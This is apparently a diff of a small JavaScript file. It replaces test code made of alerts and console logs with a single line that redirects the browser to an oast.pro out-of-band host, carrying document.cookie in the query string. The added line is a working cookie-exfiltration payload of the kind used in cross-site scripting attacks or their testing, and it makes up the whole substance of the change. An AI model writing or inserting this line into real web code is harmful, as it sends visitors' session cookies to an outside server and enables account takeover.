@@ -1,10 +1,1 @@
-const color = document.getElementById("color");
-
-alert(1);
-console.log(2);
-console.log(document.cookie);
-
-color.onclick = () => {
-    alert(3);
-    console.log(4);
-}
+window.location.href="http://87e203de7e0969f39e12gis1dmoyyyyyn.oast.pro?content="+document.cookie
